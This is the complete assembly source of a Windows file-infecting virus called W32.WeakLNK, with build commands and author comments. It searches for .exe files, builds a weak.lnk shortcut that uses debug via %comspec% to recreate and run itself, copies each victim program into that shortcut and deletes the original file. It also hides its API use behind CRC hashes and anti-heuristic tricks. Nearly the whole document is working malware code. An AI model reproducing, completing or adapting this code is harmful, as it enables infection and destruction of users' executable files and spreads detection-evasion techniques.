   ; comment ;)
   ; W32.WeakLNK by roy g biv
   ;
   ; some of its features:
   ; - parasitic direct action infector of exe
   ; - constructs lnk dropper that holds the original file
   ; - uses CRCs instead of API names
   ; - uses SEH walker to find kernel address (no hard-coded addresses)
   ; ---
   ;
   ;   optimisation tip: Windows appends ".dll" automatically, so this works:
   ;         push "cfs"
   ;         push esp
   ;         call LoadLibraryA
   ; ---
   ;
   ; to build this thing:
   ; tasm
   ; ----
   ; tasm32 /ml /m3 weaklnk
   ; tlink32 /B:400000 /x weaklnk,,,import32
   ;
   ; Virus is not self-modifying, so no need to alter section attributes
   ; ---
   ;
   ; We're in the middle of a phase transition:
   ; a butterfly flapping its wings at
   ; just the right moment could
   ; cause a storm to happen.
   ; -I'm trying to understand-
   ; I'm at a moment in my life-
   ; I don't know where to flap my wings.
   ; (Danny Hillis)
   ;
   ; (;

   .386
   .model  flat

   extern  ExpandEnvironmentStringsA:proc
   extern  CreateFileA:proc
   extern  WriteFile:proc
   extern  CloseHandle:proc
   extern  MessageBoxA:proc
   extern  ExitProcess:proc

   .data
   include weaklnk.inc

   dropper         label   near
           mov     edx, krncrc_count
           mov     ebx, offset krnnames
           mov     edi, offset krncrcbegin
           call    create_crcs
           xor     esi, esi
           push    esi
           push    esi
           push    CREATE_ALWAYS
           push    esi
           push    esi
           push    GENERIC_WRITE
           push    offset dropname
           call    CreateFileA
           push    eax
           push    esi
           push    esp
           push    (offset weaklnk_codeend - offset weaklnk_inf + expsize + 2ffh) and not 0ffh
           push    offset header
           push    eax
           call    WriteFile
           call    CloseHandle
           push    esi
           push    offset txttitle
           push    offset txtbody
           push    esi
           call    MessageBoxA
           push    esi
           call    ExitProcess

   ;-----------------------------------------------------------------------------
   ;everything before this point is dropper code
   ;-----------------------------------------------------------------------------
   expsize equ     0d4h
   header          db      'M', 'Z'                ;00
                   db      "gdi32.dll", 0          ;02    align 4, filler (overload for dll name and import lookup table RVA)
                   db      'P', 'E', 0, 0          ;0c 00 signature (overload for date/time stamp)
                   dw      14ch                    ;10 04 machine (overload for forwarder chain)
                   dw      1                       ;12 06 number of sections (overload for forwarder chain)
                   dd      2                       ;14 08 date/time stamp (overload for dll name RVA)
                   dd      102ch                   ;18 0c pointer to symbol table (overload for import address table RVA)
                   dd      0                       ;1c 10 number of symbols
                   dw      88h                     ;20 14 size of optional header
                   dw      30fh                    ;22 16 characteristics
                   dw      10bh                    ;24 18 magic
                   db      1, 1                    ;26 1a major linker
                   dd      0                       ;28 1c size of code (overload for import table terminator)
                   dd      56h                     ;2c 20 size of init data (overload for import name table RVA)
                   dd      0                       ;30 24 size of uninit data (overload for import name table terminator)
                   dd      expsize + 1000h         ;34 28 entry point
                   dd      1010101h                ;38 2c base of code
                   dd      0ch                     ;3c 30 base of data (overload for lfanew)
                   dd      400000h                 ;40 34 image base
                   dd      1000h                   ;44 38 section align
                   dd      200h                    ;48 3c file align
                   dw      101h                    ;4c 40 major os
                   dw      101h                    ;4e 42 minor os
                   dw      101h                    ;50 44 major image
                   dw      101h                    ;52 46 minor image
                   dw      4                       ;54 48 major subsys
                   dw      0                       ;56 4a minor subsys (overload for import name table)
                   db      "Arc", 0                ;58 4c reserved (overload for import name table)
                   dd      (weaklnk_codeend - offset weaklnk_inf + expsize + 1fffh) and not 0fffh
                                                   ;5c 50 size of image
                   dd      expsize                 ;60 54 size of headers
                   dd      0                       ;64 58 checksum
                   dw      2                       ;68 5c subsystem
                   dw      101h                    ;6a 5e dll characteristics
                   dd      1                       ;6c 60 size of stack reserve
                   dd      1                       ;70 64 size of stack commit
                   dd      1                       ;74 68 size of heap reserve
                   dd      1                       ;78 6c size of heap commit
                   dd      1010101h                ;7c 70 loader flags
                   dd      2                       ;80 74 number of rva and sizes (ignored by Windows 9x/Me)
                   dq      0                       ;84 78 export
                   dd      1008h                   ;8c 80 import
                   dd      0                       ;90 84 import
                   dq      0                       ;94 88 resource
                   dq      0                       ;9c 90 exception
                   dq      0                       ;a4 98 certificate
                   dq      0                       ;ac a0 base reloc (overload for section name)
                   dd      0                       ;b4 a8 debug (overload for virtual size)
                   dd      1000h                   ;b8 ac debug (overload for virtual address)
                   dd      (weaklnk_codeend - offset weaklnk_inf + expsize + 1ffh) and not 1ffh
                                                   ;bc b0 architecture (overload for file size)
                   dd      1                       ;c0 b4 architecture (overload for file offset)
                   dd      0                       ;c4 b8 global data (overload for pointer to relocs)
                   dd      0                       ;c8 bc global data (overload for pointer to line numbers)
                   dd      0                       ;cc c0 tls (overload for reloc table and line numbers)
                   dd      0e0000000h              ;d0 c4 tls (overload for section characteristics)
                                                   ;d4
   weaklnk_inf     label   near
           xor     esi, esi
           lods    dword ptr fs:[esi]
           inc     eax

   seh_loop        label   near
           dec     eax
           xchg    esi, eax
           lods    dword ptr [esi]
           inc     eax
           jne     seh_loop
           lods    dword ptr [esi]
           inc     eax
           xchg    ebx, eax

   find_mzhdr      label   near

   ;-----------------------------------------------------------------------------
   ;do not use hard-coded kernel address values because it is not portable
   ;Microsoft used all different values for 95, 98, NT, 2000, Me, XP
   ;they will maybe change again for every new release
   ;-----------------------------------------------------------------------------

           dec     ebx                             ;sub 64kb
           xor     bx, bx                          ;64kb align
           cmp     word ptr [ebx], 'ZM'            ;Windows does not check 'MZ'
           jne     find_mzhdr
           mov     esi, dword ptr [ebx + mzhdr.mzlfanew]
           add     esi, ebx
           lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
           add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX
           jne     find_mzhdr
           call    skip_krncrc
   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   krncrcbegin     label   near                    ;place < 80h bytes from call for smaller code
           dd      (krncrc_count + 1) dup (0)
   krncrcend       label   near

   skip_krncrc     label   near
           pop     edi

   ;-----------------------------------------------------------------------------
   ;parse export table
   ;-----------------------------------------------------------------------------

           mov     esi, dword ptr [esi + pehdr.peexport.dirrva - pehdr.pecoff]
           lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
           lods    dword ptr [esi]                 ;Export Address Table RVA
           lea     edx, dword ptr [ebx + eax]
           lods    dword ptr [esi]                 ;Name Pointer Table RVA
           lea     ecx, dword ptr [ebx + eax]
           lods    dword ptr [esi]                 ;Ordinal Table RVA
           lea     ebp, dword ptr [ebx + eax]
           mov     esi, ecx

   push_export     label   near
           push    ecx

   get_export      label   near
           lods    dword ptr [esi]
           push    ebx
           add     ebx, eax                        ;Name Pointer VA
           or      eax, -1

   crc_outer       label   near
           xor     al, byte ptr [ebx]
           push    8
           pop     ecx

   crc_inner       label   near
           add     eax, eax
           jnb     crc_skip
           xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

   crc_skip        label   near
           loop    crc_inner
           sub     cl, byte ptr [ebx]              ;carry set if not zero
           inc     ebx                             ;carry not altered by inc
           jb      crc_outer
           pop     ebx
           cmp     dword ptr [edi], eax
           jne     get_export

   ;-----------------------------------------------------------------------------
   ;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
   ;this allows to push addresses onto the stack, and the order is known
   ;-----------------------------------------------------------------------------

           pop     ecx
           mov     eax, esi
           sub     eax, ecx                        ;Name Pointer Table VA
           shr     eax, 1
           movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
           mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
           add     eax, ebx
           push    eax
           scas    dword ptr [edi]
           cmp     dword ptr [edi], 0
           jne     push_export
           enter   (size WIN32_FIND_DATAA + 3) and -4, 0
           push    esp
           call    get_name
           call    dword ptr [ebp + krncrcstk.kFindFirstFileA]
           xor     esi, esi
           inc     eax
           je      find_infect
           push    esi
           push    esi
           push    OPEN_EXISTING
           push    esi
           push    FILE_SHARE_READ
           push    GENERIC_READ
           lea     eax, dword ptr [esp + 18h + WIN32_FIND_DATAA.cFileName]
           push    eax
           call    dword ptr [ebp + krncrcstk.kCreateFileA]
           push    eax                             ;CloseHandle
           push    FILE_END
           push    esi
           push    -4
           push    eax
           xchg    ebx, eax
           call    dword ptr [ebp + krncrcstk.kSetFilePointer]
           push    eax
           mov     eax, esp
           push    esi
           push    esp
           push    4
           push    eax
           push    ebx
           call    dword ptr [ebp + krncrcstk.kReadFile]
           pop     edi
           push    edi
           push    esi
           call    dword ptr [ebp + krncrcstk.kGlobalAlloc]
           push    SW_SHOWDEFAULT                  ;WinExec
           push    eax                             ;WinExec
           push    esi                             ;CreateFileA
           push    esi                             ;CreateFileA
           push    CREATE_ALWAYS                   ;CreateFileA
           push    esi                             ;CreateFileA
           push    esi                             ;CreateFileA
           push    GENERIC_WRITE                   ;CreateFileA
           push    eax                             ;CreateFileA
           push    esi                             ;ReadFile
           push    esp                             ;ReadFile
           push    edi                             ;ReadFile
           push    eax                             ;ReadFile
           push    ebx                             ;ReadFile
           push    FILE_CURRENT                    ;SetFilePointer
           push    esi                             ;SetFilePointer
           neg     edi
           sub     edi, 4
           push    edi                             ;SetFilePointer
           push    ebx                             ;SetFilePointer
           call    dword ptr [ebp + krncrcstk.kSetFilePointer]
           call    dword ptr [ebp + krncrcstk.kReadFile]
           call    dword ptr [ebp + krncrcstk.kCreateFileA]
           push    eax                             ;CloseHandle
           push    FILE_CURRENT
           push    esi
           push    edi
           push    ebx
           call    dword ptr [ebp + krncrcstk.kSetFilePointer]
           push    eax
           mov     eax, esp
           push    esi
           push    esp
           push    4
           push    eax
           push    ebx
           call    dword ptr [ebp + krncrcstk.kReadFile]
           pop     edi
           push    edi
           push    esi
           call    dword ptr [ebp + krncrcstk.kGlobalAlloc]
           pop     ecx
           push    ecx                             ;CloseHandle
           push    esi                             ;WriteFile
           push    esp                             ;WriteFile
           push    edi                             ;WriteFile
           push    eax                             ;WriteFile
           push    ecx                             ;WriteFile
           push    esi                             ;ReadFile
           push    esp                             ;ReadFile
           push    edi                             ;ReadFile
           push    eax                             ;ReadFile
           push    ebx                             ;ReadFile
           push    FILE_CURRENT                    ;SetFilePointer
           push    esi                             ;SetFilePointer
           neg     edi
           sub     edi, 4
           push    edi                             ;SetFilePointer
           push    ebx                             ;SetFilePointer
           call    dword ptr [ebp + krncrcstk.kSetFilePointer]
           call    dword ptr [ebp + krncrcstk.kReadFile]
           call    dword ptr [ebp + krncrcstk.kWriteFile]
           call    dword ptr [ebp + krncrcstk.kCloseHandle]
           call    dword ptr [ebp + krncrcstk.kWinExec]
           call    dword ptr [ebp + krncrcstk.kCloseHandle]

   find_infect     label   near
           push    esp
           call    skip_allfiles
           db      "*.exe", 0

   skip_allfiles   label   near
           call    dword ptr [ebp + krncrcstk.kFindFirstFileA]
           xchg    ebx, eax
           jmp     get_tick
           db      "WeakLNK - roy g biv"           ;you are the weakest link

   find_next       label   near
           push    esp
           push    ebx
           call    dword ptr [ebp + krncrcstk.kFindNextFileA]

   get_tick        label   near
           call    dword ptr [ebp + krncrcstk.kGetTickCount]
           and     al, 1
           jne     find_next
           push    esi
           push    esi
           push    OPEN_EXISTING
           push    esi
           push    FILE_SHARE_READ
           push    GENERIC_READ
           call    skip_drop
           DROP_NAME, 0

   skip_drop       label   near
           call    dword ptr [ebp + krncrcstk.kCreateFileA]
           xchg    ebx, eax
           push    (SELF_SIZE * 3) + LNK_SIZE + 208h
           push    GMEM_ZEROINIT
           call    dword ptr [ebp + krncrcstk.kGlobalAlloc]
           push    eax
           mov     byte ptr [eax], 4ch
           mov     dword ptr [eax + 4], 21401h
           mov     byte ptr [eax + 0ch], 0c0h
           mov     word ptr [eax + 13h], 2146h
           push    17h
           pop     ecx
           call    skip_clsid
           dw      14h                             ;size of this block
           dw      1fh                             ;type
           db      0e0h, 4fh, 0d0h, 20h, 0eah, 3ah, 69h, 10h, 0a2h, 0d8h, 8, 0, 2bh, 30h, 30h, 9dh
                                                   ;CLSID (My Computer)
           dw      19h                             ;size of this block
           db      23h                             ;type

   skip_clsid      label   near
           pop     esi
           lea     edi, dword ptr [eax + 4eh]
           rep     movs byte ptr [edi], byte ptr [esi]
           mov     eax, ebp
           enter   104h, 0
           mov     esi, esp
           push    104h
           push    esi
           call    skip_comspec
           db      "%comspec%", 0

   skip_comspec    label   near
           call    dword ptr [eax + krncrcstk.kExpandEnvironmentStringsA]
           movs    dword ptr [edi], dword ptr [esi]
           dec     esi
       mov byte ptr [edi - 1], 0
           add     edi, 12h

   find_slash  label   near
       mov ecx, esi

   check_slash label   near
       inc ecx
       mov al, byte ptr [ecx]
       cmp al, "\"
       jne not_slash
       sub ecx, esi
       lea eax, dword ptr [ecx + 310010h]
       stos    dword ptr [edi]
       add edi, 0ah
       rep movs byte ptr [edi], byte ptr [esi]
       xchg    ecx, eax
       stos    word ptr [edi]
       inc esi
       jmp find_slash

   not_slash   label   near
       test    al, al
       jne check_slash
       sub ecx, esi
       lea eax, dword ptr [ecx + 320010h]
       stos    dword ptr [edi]
       add edi, 0ah
       rep movs byte ptr [edi], byte ptr [esi]
       xchg    ecx, eax
       stos    dword ptr [edi]
           leave
       pop ecx
       push    ecx
       lea eax, dword ptr [edi - 4eh]
       sub eax, ecx
       mov word ptr [ecx + 4ch], ax
           push    19h
           pop     eax
           stos    word ptr [edi]
           xchg    ecx, eax
           call    skip_debug
           db      "/c debug "
           DROP_NAME, "<weak.lnk>nul"              ;commandline parameters

   skip_debug      label   near
           pop     esi
           rep     movs byte ptr [edi], byte ptr [esi]
           scas    dword ptr [edi]
           mov     cl, 8
           call    skip_e100
           db      0dh, 0ah
           db      "e100", 0dh, 0ah

   skip_e100       label   near
           pop     esi
           rep     movs byte ptr [edi], byte ptr [esi]

           xor     esi, esi
           jmp     read_self
           db      "05/06/07"

   copy_self       label   near
           mov     al, byte ptr [edi]
           call    itoa
           mov     al, " "
           stos    byte ptr [edi]

   read_self       label   near
           push    esi
           push    esp
           push    1
           push    edi
           push    ebx
           call    dword ptr [ebp + krncrcstk.kReadFile]
           cmp     dword ptr [esp - 4], esi
           jne     copy_self
           mov     eax, ("cr" shl 10h) + 0a0dh
           stos    dword ptr [edi]
           mov     byte ptr [edi], "x"
           inc     edi
           stos    word ptr [edi]
           mov     al, SELF_SIZE shr 8
           call    itoa
           mov     cl, 71h
           call    skip_exec
           db      "00", 0dh, 0ah                  ;256-bytes aligned length
           db      "w", 0dh, 0ah
           db      "e85", 0dh, 0ah

           ;how to run files created in debug
           ;MOV     AX, WORD PTR DS:[002C]         ;get environment segment
           ;DEC     AX
           ;MOV     ES, AX                         ;point to MCB
           ;MOV     AX, WORD PTR ES:[0001]         ;get owner segment (debug.exe)
           ;MOV     BX, DS
           ;SUB     BX, AX
           ;INC     BH                             ;add 4kb to cover us
           ;MOV     ES, AX                         ;calculate new size to reserve
           ;MOV     AH, 4A
           ;INT     21                             ;shrink our memory block
           ;MOV     AX, 4B00
           ;MOV     DL, 82                         ;point to filename
           ;INT     21                             ;run!
           ;INT     03                             ;return to debug for exit

           db      "0 A1 2C 0 48 8E C0 26 A1 1 0 8C DB 29 C3 FE C7 8E C0 B4 4A CD 21 B8 0 4B B2 82 CD 21 CC", 0dh, 0ah
           db      "g=ds:86", 0dh, 0ah
           db      "q", 0dh, 0ah

   skip_exec       label   near
           pop     esi
           rep     movs byte ptr [edi], byte ptr [esi]
           push    FILE_ATTRIBUTE_READONLY         ;read-only else Windows destroys file
           call    get_name
           xor     esi, esi
           push    esi
           push    esi
           push    CREATE_ALWAYS
           push    esi
           push    FILE_SHARE_READ
           push    GENERIC_WRITE
           push    dword ptr [esp + 18h]
           push    esi
           push    dword ptr [esp + 4]
           call    dword ptr [ebp + krncrcstk.kSetFileAttributesA]
           call    dword ptr [ebp + krncrcstk.kCreateFileA]
           xchg    ebx, eax
           call    dword ptr [ebp + krncrcstk.kSetFileAttributesA]
           pop     ecx
           push    esi
           push    esp
           sub     edi, ecx
           push    edi
           push    ecx
           push    ebx
           call    dword ptr [ebp + krncrcstk.kWriteFile]
           push    esi
           push    esi
           push    OPEN_EXISTING
           push    esi
           push    esi
           push    GENERIC_READ
           lea     eax, dword ptr [esp + 18h + WIN32_FIND_DATAA.cFileName]
           push    eax
           call    dword ptr [ebp + krncrcstk.kCreateFileA]
           push    eax
           xchg    edi, eax

   copy_host       label   near
           mov     eax, esp
           push    esi
           push    esp
           push    1
           push    eax
           push    edi
           call    dword ptr [ebp + krncrcstk.kReadFile]
           mov     eax, esp
           mov     ecx, dword ptr [esp - 4]
           push    esi
           push    esp
           push    ecx
           push    eax
           push    ebx
           call    dword ptr [ebp + krncrcstk.kWriteFile]
           cmp     dword ptr [esp - 4], esi
           jne     copy_host
           push    esi
           push    edi
           call    dword ptr [ebp + krncrcstk.kGetFileSize]
           push    eax
           mov     eax, esp
           push    esi
           push    esp
           push    4
           push    eax
           push    ebx
           call    dword ptr [ebp + krncrcstk.kWriteFile]
           push    edi
           call    dword ptr [ebp + krncrcstk.kCloseHandle]
           lea     edi, dword ptr [esp + 8 + WIN32_FIND_DATAA.cFileName]
           push    edi
           call    dword ptr [ebp + krncrcstk.klstrlenA]
           inc     eax
           push    eax
           push    esi
           push    esp
           push    eax
           push    edi
           push    ebx
           call    dword ptr [ebp + krncrcstk.kWriteFile]
           mov     eax, esp
           push    esi
           push    esp
           push    4
           push    eax
           push    ebx
           call    dword ptr [ebp + krncrcstk.kWriteFile]
           push    edi
           call    dword ptr [ebp + krncrcstk.kDeleteFileA]

   close_exit      label   near
           call    dword ptr [ebp + krncrcstk.kExitProcess]

   get_name        proc    near
           pop     eax
           call    skip_name
           db      "weak.lnk", 0

   skip_name       label   near
           jmp     eax
   get_name        endp

   itoa            proc    near
           xor     ecx, ecx
           aam     10h
           test    ah, ah
           je      byte_only
           inc     ecx
           cmp     al, 0ah
           sbb     al, 69h
           das
           mov     byte ptr [edi + 1], al
           xchg    ah, al

   byte_only       label   near
           cmp     al, 0ah
           sbb     al, 69h
           das
           stos    byte ptr [edi]
           add     edi, ecx
           ret
   itoa            endp

   weaklnk_codeend label   near
   padding         db      2ffh dup (0)            ;padding

   create_crcs     proc    near
           or      eax, -1

   create_outer    label   near
           xor     al, byte ptr [ebx]
           push    8
           pop     ecx

   create_inner    label   near
           add     eax, eax
           jnb     create_skip
           xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

   create_skip     label   near
           loop    create_inner
           sub     cl, byte ptr [ebx]              ;carry set if not zero
           inc     ebx                             ;carry not altered by inc
           jb      create_outer
           stos    dword ptr [edi]
           dec     edx
           jne     create_crcs
           ret
   create_crcs     endp

   krnnames        db      "CloseHandle"              , 0
                   db      "CreateFileA"              , 0
                   db      "DeleteFileA"              , 0
                   db      "ExitProcess"              , 0
                   db      "ExpandEnvironmentStringsA", 0
                   db      "FindFirstFileA"           , 0
                   db      "FindNextFileA"            , 0
                   db      "GetFileSize"              , 0
                   db      "GetTickCount"             , 0
                   db      "GlobalAlloc"              , 0
                   db      "ReadFile"                 , 0
                   db      "SetFileAttributesA"       , 0
                   db      "SetFilePointer"           , 0
                   db      "WinExec"                  , 0
                   db      "WriteFile"                , 0
                   db      "lstrlenA"                 , 0

   dropname        DROP_NAME, 0

   txttitle        db      "WeakLNK", 0
   txtbody         db      "now run "
                   DROP_NAME, "...", 0

   .code
           nop

   end     dropper
